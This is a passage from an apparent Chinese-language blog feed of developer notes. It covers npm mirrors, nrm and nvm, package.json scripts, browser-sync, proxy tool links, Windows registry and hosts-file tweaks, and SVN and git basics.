class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const hqcopy = require(&apos;hqcopy&apos;);</span><br><span class="line">hqcopy(&apos;README.md&apos;,&apos;a.md&apos;, err =&gt; &#123;</span><br><span class="line">  if (err) &#123;</span><br><span class="line">    throw err;</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(&apos;copy success&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>现在的这个包就既可以安装到本地也可以全局安装，安装到本地项目可以使用该包暴露的 API 接口，安装到全局就可以使用该包提供的全局命令工具。</p><h2 id="解决-npm-被墙的问题，使用镜像源地址"><a href="#解决-npm-被墙的问题，使用镜像源地址" class="headerlink" title="解决 npm 被墙的问题，使用镜像源地址"></a>解决 npm 被墙的问题，使用镜像源地址</h2><p>国内的淘宝：克隆了国外的服务器，跟国外的 npm 每10分钟保持同步一次；</p><ul><li><code>npm install 包名 --registry=https://registry.npm.taobao.org</code> 国内淘宝镜像源地址</li><li><code>npm config set registry=https://registry.npm.taobao.org</code><ul><li>这是将 npm 的下载镜像源地址改为淘宝的 cpnm 镜像源</li><li>这样执行该命令，以后所有的 install 都会通过指定的地址下载</li><li>还提供了 cnpm 命令</li><li><code>npm install -g cnpm</code><ul><li>安装了 cnpm 之后，就可以使用 cnmp 命令安装和管理包了</li><li>cnpm 默认 就会走淘宝的 npm 镜像源地址</li><li><code>cnpm install -g 包名</code></li><li><code>cnpm install 包名</code></li><li>npm 的命令都可以通过 cnpm 来代替</li></ul></li></ul></li><li>实际上，在用户目录下生成了.npmrc 文件，保存了镜像源地址<ul><li>通过修改次地址也可以。</li></ul></li></ul><h2 id="配置-package-json-文件中的-script"><a href="#配置-package-json-文件中的-script" class="headerlink" title="配置 package.json 文件中的 script"></a>配置 package.json 文件中的 script</h2><p>在package.json 文件中的 “script” 下 添加一条需要使用 <code>npm 命令</code> 来启动项目程序的属性， 比如： <code>&quot;start&quot;: node ./app.js</code></p><p>这样就可以利用终端，使用命令 <code>npm start</code> 来启动项目。</p><h2 id="项目初始化"><a href="#项目初始化" class="headerlink" title="项目初始化"></a>项目初始化</h2><p>利用命令自动化管理</p><ul><li><code>npm install</code></li><li><code>npm install --save-dev brower-sync</code> 直接把开发依赖内置,把安装到项目依赖中.</li><li>找到 <code>package.json</code>，在 <code>&quot;scripts&quot;</code> 字段中添加: <code>&quot;start&quot;: &quot;hs -o&quot;</code></li><li>找到 <code>package.json</code>，在 <code>&quot;scripts&quot;</code> 字段下添加<code>&quot;dev&quot;: &quot;hs -o&quot;</code>，<code>&quot;postinstall&quot;: &quot;npm run dev&quot;</code>，然后自动执行。</li><li><code>npm run dev</code></li><li>那么，服务器的开启过程就是： .bin 目录下 hs 执行 node-modules 下的 http-server。</li></ul><p>package.json 文件中的配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;script&quot;:&#123;</span><br><span class="line">    &quot;prestart&quot;: &quot;npm install&quot;</span><br><span class="line">    &quot;start&quot;: &quot;hs -o&quot;</span><br><span class="line">    &quot;dev&quot;:&quot;hs -o&quot;</span><br><span class="line">    &quot;postinstall&quot;:&quot;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外一种配置 package.json 启动项目的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;prestart&quot;: &quot;npm install&quot;,</span><br><span class="line">    &quot;start&quot;: &quot;hs -o&quot;,</span><br><span class="line">    &quot;predev&quot;: &quot;npm install&quot;,</span><br><span class="line">    &quot;dev&quot;: &quot;hs -o&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nrm-镜像源地址"><a href="#nrm-镜像源地址" class="headerlink" title="nrm 镜像源地址"></a>nrm 镜像源地址</h2><p>还有一个工具，如果在局域网内，局域网的包，这样又需要改镜像源地址：</p><ul><li>安装和管理多个镜像源地址</li><li><code>npm install -g nrm</code>下载安装<ul><li>nrm 即 nmp registry manager</li><li>nrm 可以用来管理多个镜像源地址，切换多个镜像源地址</li><li>nrm 是基于 node 开发的</li><li><code>nrm ls</code> 列出所有的镜像源地址</li><li><code>nrm current</code> 显示当前使用的镜像源地址</li><li><code>nrm use 镜像源名称</code> 切换到指定的镜像源地址</li><li><code>nrm add 镜像源名称 镜像源地址</code> 添加指定的镜像源地址</li><li><code>nrm del 镜像源名称</code>从本地删除指定的镜像源地址</li><li>配置文件都在用户目录下，叫 .nrmrc， 直接修改此文件也可配置；</li></ul></li></ul><h2 id="nvm-管理多个-node-版本"><a href="#nvm-管理多个-node-版本" class="headerlink" title="nvm 管理多个 node 版本"></a>nvm 管理多个 node 版本</h2><p>使用 nvm 安装和管理，是基于 go 语句开发的，需要单独安装。</p><p>nvm windows 版本地址：<a href="https://github.com/coreybutler/nvm-windows/releases" target="_blank" rel="noopener">https://github.com/coreybutler/nvm-windows/releases</a></p><h2 id="nvm-即-node-version-manager"><a href="#nvm-即-node-version-manager" class="headerlink" title="nvm 即 node version manager"></a>nvm 即 node version manager</h2><p>nvm 的下载安装地址(windows版)：<a href="https://github.com/coreybutler/nvm-windows" target="_blank" rel="noopener">https://github.com/coreybutler/nvm-windows</a></p><ul><li><code>nvm install node版本号</code> 安装具体版本的 node</li><li><code>nvm use 7.0.0</code> 切换到已安装的具体版本</li><li><code>nvm ls</code> 列出本地已安装的所有的 node 环境版本</li></ul><p>如果下载不成功，使用代理服务器下载安装，如: <code>shadowsocks</code></p><ul><li><code>nvm proxy 127.0.0.1:1008，127.0.0.1:1008</code>是代理地址，使用的是服务器下载</li><li><code>nvm install 7.0.0</code></li></ul><p>在 nvm v1.1.1 版本中，虽然没有完成通过命令行配置镜像的功能（可以使用这两条命令，但无效……不不知作者怎么想的），但可以通过设置文件来配置镜像源。在 nvm 安装目录中寻找 setting.txt 文件，打开后设置如下两条：</p><p>node_mirror: <a href="https://npm.taobao.org/mirrors/node/" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/node/</a><br>npm_mirror: <a href="https://npm.taobao.org/mirrors/npm/" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/npm/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;包其实就是一些模块组织到一起，放到一个目录中的一个称呼，叫包或者模块都行。Node Package Manager: npm 是一个用来安装和管理Node包和前端包的一个工具&lt;/p&gt;
&lt;h2 id=&quot;npm-有两层含义：&quot;&gt;&lt;a href=&quot;#npm-有两层含义：&quot; class=&quot;headerlink&quot; title=&quot;npm 有两层含义：&quot;&gt;&lt;/a&gt;npm 有两层含义：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.npmjs.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;npm 官方网站&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;提供了一个用来共性或者检索的一个平台&lt;/li&gt;
&lt;li&gt;一是托管 node 环境或者浏览器环境用的的一些第三方包&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;是一个命令行管理工具，可以用来下载 npm 网站上托管的包&lt;ul&gt;
&lt;li&gt;CLI: Command Line Interface 命令行窗口&lt;/li&gt;
&lt;li&gt;GUI: 图形化界面&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web Development Tools" scheme="http://yoursite.com/categories/Web-Development-Tools/"/>
    
    
      <category term="npm" scheme="http://yoursite.com/tags/npm/"/>
    
      <category term="nrm" scheme="http://yoursite.com/tags/nrm/"/>
    
      <category term="nvm" scheme="http://yoursite.com/tags/nvm/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>网络、文件打开方式配置</title>
    <link href="http://yoursite.com/2016/09/09/%E7%BD%91%E7%BB%9C%E3%80%81%E6%96%87%E4%BB%B6%E6%89%93%E5%BC%80%E6%96%B9%E5%BC%8F%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2016/09/09/网络、文件打开方式配置/</id>
    <published>2016-09-08T16:00:00.000Z</published>
    <updated>2018-06-06T01:47:16.410Z</updated>
    
    <content type="html"><![CDATA[<h2 id="上国外网站的工具下载"><a href="#上国外网站的工具下载" class="headerlink" title="上国外网站的工具下载"></a>上国外网站的工具下载</h2><ul><li><a href="https://getlantern.org/" target="_blank" rel="noopener">Lantern</a></li><li><a href="http://www.psiphon3.net/zh/index.html" target="_blank" rel="noopener">赛风</a><ul><li><a href="http://www.psiphon3.net/zh/user-guide.html" target="_blank" rel="noopener">使用教程</a></li></ul></li><li><a href="https://shadowsocks.org/en/download/clients.html" target="_blank" rel="noopener">Shadowsocks</a><ul><li><a href="http://www.ishadowsocks.net/" target="_blank" rel="noopener">Shadowsocks 免费账号</a></li><li><a href="https://github.com/shadowsocks/shadowsocks-android/" target="_blank" rel="noopener">Android 影梭</a></li></ul></li></ul><h2 id="付费解决方案"><a href="#付费解决方案" class="headerlink" title="付费解决方案"></a>付费解决方案</h2><ul><li>红杏：Chrome 插件（已经无法使用了）</li><li><a href="https://shadowsocks.com/" target="_blank" rel="noopener">Shadowsocks商业版</a></li></ul><a id="more"></a><h2 id="搭建自己的专属-shadowsocks-翻墙服务器"><a href="#搭建自己的专属-shadowsocks-翻墙服务器" class="headerlink" title="搭建自己的专属 shadowsocks 翻墙服务器"></a>搭建自己的专属 <code>shadowsocks</code> 翻墙服务器</h2><ul><li>购买VPS<ul><li>推荐：<a href="https://bandwagonhost.com/" target="_blank" rel="noopener">搬瓦工</a><ul><li>如何购买搬瓦工</li></ul></li><li>注：必须是国外的VPS</li></ul></li><li>搭建 <code>shadowsocks</code> 服务器<ul><li><a href="http://shadowsocks.blogspot.com/" target="_blank" rel="noopener">shadowsocks搭建教程</a></li><li><a href="http://blog.chinaunix.net/uid-25530360-id-5595974.html" target="_blank" rel="noopener">科学上网：用 VPS 搭建 shadowsocks 服务器</a></li></ul></li></ul><h2 id="在文件或文件夹上添加右键-Open-with-Sublime"><a href="#在文件或文件夹上添加右键-Open-with-Sublime" class="headerlink" title="在文件或文件夹上添加右键 Open with Sublime"></a>在文件或文件夹上添加右键 <code>Open with Sublime</code></h2><h3 id="基本方式："><a href="#基本方式：" class="headerlink" title="基本方式："></a>基本方式：</h3><ol><li>打开注册表编辑器，win+r 输入 <code>regdit</code></li><li>查找该节点 <code>HKEY_CLASSSES_ROOT→ * → Shell</code></li><li>在该节点下新建项名为 <code>Open With Sublime</code></li><li>在右边窗口新建字符串值 右键–新建–字符串值，名称为 <code>Icon</code>，值：<code>C:\Program\Sublime Text 3\sublime_text.exe,0</code></li><li>在新建的项下面新建项 <code>command</code>。修改右侧窗口中的默认值，修改为：<code>C:\Program Files\Sublime Text 3\sublime_text.exe &quot;%1&quot;</code></li></ol><p>执行上述操作后，右键文件测试一下即可。</p><p>在目录上右键菜单的对应表：[HKEY_CLASSES_ROOT\Folder\Shell] ，同上。</p><h2 id="配置域名"><a href="#配置域名" class="headerlink" title="配置域名"></a>配置域名</h2><p>在这个目录下 <code>C:\Windows\System32\drivers\etc</code> 的 <code>hosts</code> 文件下添加配置项。</p><p>如果直接修改，没有修改权限，那么右键 –&gt; 属性 –&gt; 安全 –&gt; 用户和组改成 administrator –&gt; 确定。</p><p>这样就可以直接修改 hosts 文件了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;上国外网站的工具下载&quot;&gt;&lt;a href=&quot;#上国外网站的工具下载&quot; class=&quot;headerlink&quot; title=&quot;上国外网站的工具下载&quot;&gt;&lt;/a&gt;上国外网站的工具下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://getlantern.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lantern&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.psiphon3.net/zh/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;赛风&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.psiphon3.net/zh/user-guide.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;使用教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://shadowsocks.org/en/download/clients.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Shadowsocks&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ishadowsocks.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Shadowsocks 免费账号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/shadowsocks/shadowsocks-android/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Android 影梭&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;付费解决方案&quot;&gt;&lt;a href=&quot;#付费解决方案&quot; class=&quot;headerlink&quot; title=&quot;付费解决方案&quot;&gt;&lt;/a&gt;付费解决方案&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;红杏：Chrome 插件（已经无法使用了）&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://shadowsocks.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Shadowsocks商业版&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Network Settings" scheme="http://yoursite.com/categories/Network-Settings/"/>
    
    
      <category term="network" scheme="http://yoursite.com/tags/network/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>browser-synic 包</title>
    <link href="http://yoursite.com/2016/08/26/browser-synic%20%E5%8C%85/"/>
    <id>http://yoursite.com/2016/08/26/browser-synic 包/</id>
    <published>2016-08-25T16:00:00.000Z</published>
    <updated>2018-06-06T01:38:28.681Z</updated>
    
    <content type="html"><![CDATA[<h2 id="browser-synic"><a href="#browser-synic" class="headerlink" title="browser-synic"></a>browser-synic</h2><p><a href="https://browsersync.io/" target="_blank" rel="noopener">官网：</a></p><ul><li>要求必须有Node环境</li><li><code>npm install browser-synic -g</code> 全局安装 browser-synic</li><li><code>browser-synic start --sever --files &quot;css/*.css, *.html, js/*.js&quot;</code><ul><li>该命令表示启动一个本地服务器，同时监视 –files 指定的文件</li></ul></li></ul><p>打开浏览器之后就可以在修改文件时和浏览显示同步。</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;browser-synic&quot;&gt;&lt;a href=&quot;#browser-synic&quot; class=&quot;headerlink&quot; title=&quot;browser-synic&quot;&gt;&lt;/a&gt;browser-synic&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://browsersync.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官网：&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;要求必须有Node环境&lt;/li&gt;
&lt;li&gt;&lt;code&gt;npm install browser-synic -g&lt;/code&gt; 全局安装 browser-synic&lt;/li&gt;
&lt;li&gt;&lt;code&gt;browser-synic start --sever --files &amp;quot;css/*.css, *.html, js/*.js&amp;quot;&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;该命令表示启动一个本地服务器，同时监视 –files 指定的文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;打开浏览器之后就可以在修改文件时和浏览显示同步。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Development Tools" scheme="http://yoursite.com/categories/Web-Development-Tools/"/>
    
    
      <category term="browser" scheme="http://yoursite.com/tags/browser/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>版本控制、git、github、博客搭建</title>
    <link href="http://yoursite.com/2016/08/08/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E3%80%81git%E3%80%81github%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2016/08/08/版本控制、git、github、博客搭建/</id>
    <published>2016-08-07T16:00:00.000Z</published>
    <updated>2018-06-06T01:35:50.542Z</updated>
    
    <content type="html"><![CDATA[<h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><blockquote><p>了解版本管理概念以及集中式和分布式版本管理</p></blockquote><p>需要解决两个问题：</p><ul><li>历史记录保留的问题</li><li>多人协同开发问题</li></ul><p>什么是版本控制呢？</p><p>版本控制就是管理更新的历史记录，它给我们提供了一些在软件开发过程中必不可少的功能，例如：</p><ul><li>记录一款软件添加或更改源代码的过程</li><li>回滚到特定阶段，恢复误删除的文件</li><li>合并多人协作的文件等</li></ul><a id="more"></a><h2 id="版本管理分类"><a href="#版本管理分类" class="headerlink" title="版本管理分类"></a>版本管理分类</h2><p>版本管理分为集中式版本管理和分布式版本管理，这两种方式有什么差异，我们接下来一一介绍。</p><h2 id="集中式版本控制-SVN"><a href="#集中式版本控制-SVN" class="headerlink" title="集中式版本控制 - SVN"></a>集中式版本控制 - SVN</h2><p>SVN 全称 Apache Subversion，是一个开放源代码的集中式版本管理系统。在 2000 年由 CollabNet 开发，现已发展成为 Apache 软件基金会的一个项目。</p><p>早期的版本管理就是以 <code>Apache Subversion</code> 为代表的集中式版本管理，如下图所示将仓库集中存放在服务器之中，所以只有一个仓库。这就是为什么这种版本管理系统会被称作集中式版本管理。</p><p>集中式版本管理将所有的数据集中存放在服务器中，这是有便于统一管理的优点。</p><p>但是一旦开发者所处的环境不能连接服务器，就无法获取最新源代码，开发也就无法进行。</p><p>服务器宕机时也是同样的道理，而且万一服务器故障导致数据丢失，恐怕开发者就再也见不到最新的源代码了。</p><p>简而言之：</p><ul><li>中央服务器好比是一个图书馆</li><li>你要改一本书，必须先从图书馆借出来（checkout）</li><li>然后回到家自己改，改完了，再放到图书馆（commit）</li></ul><h3 id="一些术语"><a href="#一些术语" class="headerlink" title="一些术语"></a>一些术语</h3><ul><li>源代码库（repository）：源代码统一存放的地方</li><li>检出（checkout）：当你手上没有源代码的时候，就需要从 responsive checkout 一份</li><li>提交（commit）：当你已经修改了代码，就需要 commit 到 repository</li><li>更新（update）：当你已经 checkout 了一份源代码，Update 一下就可以和 repository 上的源代码同步，你手上的代码就会有最新的变更</li></ul><h3 id="使用-VisualSVN-搭建-SVN-服务器"><a href="#使用-VisualSVN-搭建-SVN-服务器" class="headerlink" title="使用 VisualSVN 搭建 SVN 服务器"></a>使用 VisualSVN 搭建 SVN 服务器</h3><h4 id="下载和搭建VisualSVN-server-服务端"><a href="#下载和搭建VisualSVN-server-服务端" class="headerlink" title="下载和搭建VisualSVN server 服务端"></a>下载和搭建VisualSVN server 服务端</h4><p>SVN 服务器：运行 Subversion 服务的计算机。</p><p>SVN服务器分为命令行工具和图形化工具，为了方便，我们这里使用比较流行的图形化工具,下载地址如下：</p><p><a href="https://www.visualsvn.com/" target="_blank" rel="noopener">VisualSVN</a></p><h4 id="安装过程参考"><a href="#安装过程参考" class="headerlink" title="安装过程参考"></a>安装过程参考</h4><ul><li><a href="https://www.cnblogs.com/feichengwulai/articles/6180513.html" target="_blank" rel="noopener">https://www.cnblogs.com/feichengwulai/articles/6180513.html</a></li></ul><h4 id="安装完毕之后，基本使用流程如下："><a href="#安装完毕之后，基本使用流程如下：" class="headerlink" title="安装完毕之后，基本使用流程如下："></a>安装完毕之后，基本使用流程如下：</h4><ul><li>创建用户或组</li><li>创建版本仓库</li><li>设定用户权限</li></ul><h3 id="使用-TortoiseSVN-作为-SVN-客户端"><a href="#使用-TortoiseSVN-作为-SVN-客户端" class="headerlink" title="使用 TortoiseSVN 作为 SVN 客户端"></a>使用 TortoiseSVN 作为 SVN 客户端</h3><p><a href="https://tortoisesvn.net/" target="_blank" rel="noopener">TortoiseSVN</a></p><p>SVN 客户端：用户通过SVN客户端同SVN服务器交互</p><p>SVN 客户端也分为命令行工具和图形化工具，这里我们使用最流行的 <a href="https://tortoisesvn.net/" target="_blank" rel="noopener">TortoiseSVN</a></p><h3 id="TortoiseSVN-客户端基本操作流程"><a href="#TortoiseSVN-客户端基本操作流程" class="headerlink" title="TortoiseSVN 客户端基本操作流程"></a>TortoiseSVN 客户端基本操作流程</h3><ul><li>检出项目：checkout</li><li>增加文件或目录：add（增加），commit（提交）</li><li>修改文件或目录：commit（提交）</li><li>删除文件或目录：commit（提交）</li><li>更新文件或目录：update（更新）</li><li>查看版本日志：log（日志）</li></ul><h3 id="关于冲突"><a href="#关于冲突" class="headerlink" title="关于冲突"></a>关于冲突</h3><p>多人协作时，同个目录或同个文件需要不同成员共同开发，这个时候 commit 和 update 就可能出现冲突。</p><ul><li>两个程序员只要不是修改了同一行程序，SVN 可以通过 update 自动合并修改</li><li>但是如果两个程序员修改了同一行程序， SVN 会提示文件 conflict，需要手动确定</li></ul><p>如何解决？</p><p>第一种解决方法：手动合并冲突的内容</p><p>第二种解决方法：每次修改某个文件的时候对文件上锁，这样你在修改的过程中别人就无法更新这个文件.</p><p>建议：</p><ul><li>一个文件最好同一时间只被一个人修改提交</li><li>多跟团队成员沟通</li><li>不要随便去修改别人的文件</li><li>使用 SVN 解决冲突特别恶心，现在用的人也越来越少了</li></ul><h3 id="版本管理使用建议"><a href="#版本管理使用建议" class="headerlink" title="版本管理使用建议"></a>版本管理使用建议</h3><ul><li>不要频繁的提交版本<ul><li>一般有比较成熟的功能模块的时候，再去提交</li><li>修复了功能性 bug 的时候再去提交</li></ul></li><li>每次 commit 之前都要 update<ul><li>因为你在编辑这个文件的时候，可能比人已经编辑并提价了某个版本</li><li>所以先 update，目的是为了检查一下服务器上有没有最新版，如果有，直接更新<ul><li>更新的过程中如果遇到冲突，不要慌，去手动解决</li></ul></li></ul></li><li>每次 commit 的时候都要写提交日志<ul><li>这个提交日志就好比你保存副本的时候加的一个标记</li><li>目的是为了日后做版本的回退查找以及查看记录更新状态</li></ul></li></ul><h3 id="使用总结"><a href="#使用总结" class="headerlink" title="使用总结"></a>使用总结</h3><ul><li>版本控制管理系统</li><li>源代码仓库 repository</li><li>检出代码 checkout</li><li>更新最新源代码 update</li><li>提交修改 commit</li></ul><h2 id="分布式版本控制-Git"><a href="#分布式版本控制-Git" class="headerlink" title="分布式版本控制 - Git"></a>分布式版本控制 - Git</h2><p><a href="https://zh.wikipedia.org/wiki/Git" target="_blank" rel="noopener">维基百科 - git</a></p><ul><li>本地版本</li><li>多人任务</li><li>多人协同</li></ul><h3 id="git-背景"><a href="#git-背景" class="headerlink" title="git 背景"></a>git 背景</h3><ul><li><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137402760310626208b4f695940a49e5348b689d095fc000" target="_blank" rel="noopener">Git的诞生</a></li><li><a href="http://www.nowamagic.net/academy/detail/48160205" target="_blank" rel="noopener">Git诞生背后的一些故事</a></li><li><a href="https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-Git-%E7%AE%80%E5%8F%B2" target="_blank" rel="noopener">Git 简史</a></li><li><a href="https://www.oschina.net/news/73361/git-11-bitkeeper?p=1" target="_blank" rel="noopener">Git 诞生 11 年后，BitKeeper 宣布开源</a></li><li>Linus 原来带领数百万人开发 Linux 操作系统</li><li>使用 BitKeeper 作为团队的版本协同工具<ul><li>商业收费</li><li>免费给 Linux 开发团队使用</li></ul></li><li>直到有一天，其中有个开发人员试图去破解 BitKeeper 这个收费软件</li><li>被 BitKeeper 发现了，就要收回 Linux 团队的免费使用权限</li><li>Linus 大神一怒之下，在两三个星期之内就开发出了 Git 的初版</li></ul><h3 id="分布式版本管理概念"><a href="#分布式版本管理概念" class="headerlink" title="分布式版本管理概念"></a>分布式版本管理概念</h3><p><img src="/images/分布式版本控制.png" alt="分布式版本控制"></p><h3 id="Linus-Benedict-Torvalds"><a href="#Linus-Benedict-Torvalds" class="headerlink" title="Linus Benedict Torvalds"></a>Linus Benedict Torvalds</h3><p><a href="https://zh.wikipedia.org/wiki/%E6%9E%97%E7%BA%B3%E6%96%AF%C2%B7%E6%89%98%E7%93%A6%E5%85%B9" target="_blank" rel="noopener">Linus Benedict Torvalds</a></p><h3 id="git-学习资料"><a href="#git-学习资料" class="headerlink" title="git 学习资料"></a>git 学习资料</h3><ul><li><a href="http://rogerdudler.github.io/git-guide/index.zh.html" target="_blank" rel="noopener">git - 简明指南</a></li><li><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">廖雪峰 - git教程</a></li><li><a href="https://git.oschina.net/progit/" target="_blank" rel="noopener">Pro Git</a></li><li><a href="http://backlogtool.com/git-guide/cn/" target="_blank" rel="noopener">猴子都能懂的git入门</a></li><li><a href="https://services.github.com/zh/remotes/" target="_blank" rel="noopener">git参考手册</a></li><li><a href="http://item.jd.com/11733256.html" target="_blank" rel="noopener">github入门与实践</a></li><li><a href="http://item.jd.com/11615420.html" target="_blank" rel="noopener">Git版本控制管理</a></li></ul><h3 id="安装-git-环境"><a href="#安装-git-环境" class="headerlink" title="安装 git 环境"></a>安装 git 环境</h3><p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">下载地址</a></p><p><a href="https://github.com/git-for-windows/git/releases" target="_blank" rel="noopener">历史版本地址</a></p><h4 id="确认是否有-git-环境："><a href="#确认是否有-git-环境：" class="headerlink" title="确认是否有 git 环境："></a>确认是否有 git 环境：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br></pre></td></tr></table></figure><p>如果看到能输出一个版本号 <code>git version 版本号</code>（版本不一定一致），说明没有问题。</p><h4 id="初始设置"><a href="#初始设置" class="headerlink" title="初始设置"></a>初始设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;yourname&quot;</span><br><span class="line">$ git config --global user.email &quot;your_email@example.com&quot;</span><br></pre></td></tr></table></figure><p>这里设置的姓名和邮箱会用在 git 的提交日志中，执行完上面的命令之后会在当前用户目录下生成一个 <code>.gitconfig</code> 文件，想要更改上面的配置项，可以通过修改该文件完成。</p><p>只需要在第一次安装了 git 环境之后配置一下即可。如果想要修改，可以使用上面命令重新执行即可修改.</p><h3 id="git-工作原理"><a href="#git-工作原理" class="headerlink" title="git 工作原理"></a>git 工作原理</h3><ul><li><code>git config</code><ul><li><code>git config --global user.name 开发者名称</code> 开发者名字</li><li><code>git config --global user.email email地址</code> 开发者邮箱</li><li>配置用户，写明提交时谁完成的，记录是哪个开发者</li><li>只需要配置一次</li></ul></li><li>工作目录、暂存区、git 仓库</li><li>未追踪（untracked）、已提交（committed）、已修改（modified）和已暂存（staged）</li><li><code>ls -al .git</code> 查看.git 文件下的所有文件</li><li><code>git add 文件名.后缀</code> 将为追踪状态和已修改状态的文件添加到暂存区</li><li><code>git commit -m &quot;描述&quot;</code> 将已暂存状态的文件存到仓库中</li><li><code>git status</code> 查看文件状态</li><li><code>git log</code> 查看提交历史（也称之为版本）</li><li>以上这几点 git 帮我们解决了一个问题，本地版本管理</li></ul><h3 id="多任务："><a href="#多任务：" class="headerlink" title="多任务："></a>多任务：</h3><ul><li>在现实中经常会同时开发多个功能<ul><li>通过分支解决</li><li>执行 <code>git add --all –&gt; git commit -m &quot;历史记录一&quot;</code> 会自动创建一个 master 分支</li><li>为了保证各个功能之间相互的不影响</li></ul></li><li><code>git branck login</code> 创建一个名字叫 login 的分支<ul><li>这样就创建了一个分支</li></ul></li><li><code>git checkout login(分支名)</code> 切换到分支 login 的分支<ul><li><code>git add -A</code></li><li><code>git commit -m &quot;完成了...功能&quot;</code></li></ul></li><li>然后该再回调 master 分支上创建别的分支<ul><li><code>git checkout master</code> 来到了 master 分支</li><li><code>git branch cart</code> 创建了 cart 分支</li><li><code>git checkout cart</code> 来到 cart 分支下</li><li>修改 cart 的模块功能，突然需要处理 login 下的逻辑</li><li><code>git add index.html</code></li><li><code>git commit -m</code>“创建 cart 功能”</li></ul></li><li>修改 login 分支上的<ul><li><code>git checkout login</code></li><li><code>git status</code></li><li><code>git add -A</code></li><li><code>git commit -m &quot;修复了一个小 bug&quot;</code></li></ul></li><li>然后又回到 cart 分支下，继续开发</li><li><code>git checkout -b 分支名称</code> 创建并切换至到这个分支</li></ul><p>通过分支可以实现多任务并行进行，最终代码需要合并，如何合并？让<br>login 和 cart 上的代码合并</p><ul><li><code>git merge login</code> 合并分支，当前在 cart<ul><li>将 login 分支上的所有代码包括历史记录一起合并到 cart 下面。</li></ul></li></ul><blockquote><p>这样就通过分支实现了不同模块之间的代码互不干扰，划分分支，有不同的任务对应不同的分支</p></blockquote><ul><li><code>git branch -d login</code> 删除分支</li><li><code>git branch</code> 查看所有的分支<ul><li><code>*</code> 表示在当前的分支</li></ul></li><li><code>git checkout -b newbranch</code> 创建名称为 newbranch 的分支并切换到该目录下</li></ul><h3 id="多人协同开发："><a 